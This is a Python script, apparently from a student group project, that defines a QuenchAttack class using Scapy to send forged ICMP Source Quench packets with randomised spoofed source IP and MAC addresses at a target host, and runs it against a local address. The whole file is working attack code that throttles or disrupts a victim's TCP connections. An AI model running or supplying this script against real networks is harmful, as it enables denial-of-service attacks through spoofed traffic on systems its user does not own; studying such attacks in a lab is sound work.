from scapy.all import *
from getmac import get_mac_address
import random


# Adam: Encapsulated attack code in a class format (code restructuring for clarity).
# Rami: Send_ICMPblind_packet, prepare, start (self) functions.  
# Hussein Fakih: Get IP and MAC addresses function, automatic mac and IP address function. 
class QuenchAttack:
    def __init__(self, inputIp, packetsToSend):
        self.inputIp = inputIp
        self.packetsToSend = packetsToSend

    # Automatically get the MAC Address if IP exists on the network
    def GetMacAddress(self, IP):
        mac = get_mac_address(ip = IP)
        if (mac==None):
            print("No one has " + str(IP) + ". (No MAC address found for this given IP)")
            sys.exit(2)
        return mac

    #Build and send ICMP Quench packet
    def send_icmpBlind_packet(self, src_ip, dest_ip, src_mac, dest_mac, src_port, dest_port):
        eth_h = Ether(src=src_mac, dst=dest_mac)
        ip_h = IP(dst=dest_ip, src=src_ip)
        icmp_h = ICMP(type=4, code=4)
        ip2_h = IP(dst=dest_ip, src=src_ip, proto=6, flags=0x02)
        tcp2_h = TCP(sport=src_port, dport=dest_port)
        pkt = eth_h/ip_h/icmp_h/ip2_h/tcp2_h
        sendp(pkt)

    # Prepare inputs for packet
    def prepare(self, dest, packetsToSend):
        src_ip = RandIP()
        dest_ip = dest
        src_mac = RandMAC()
        dest_mac = self.GetMacAddress(dest_ip)
        src_port = random.randint(1024, 65535)
        dest_port = random.randint(1024, 65535)

        for _ in range (packetsToSend):
            self.send_icmpBlind_packet(src_ip, dest_ip, src_mac, dest_mac, src_port, dest_port)


    def start(self):
        try:
            packetsToSend = int(self.packetsToSend)
        except:
            print("Packet to send input must be an integer!")
            sys.exit(2)
        self.prepare(str(self.inputIp), packetsToSend)


if __name__ == "__main__":
    attack = QuenchAttack(inputIp = "192.168.0.108", packetsToSend = 10)
    attack.start()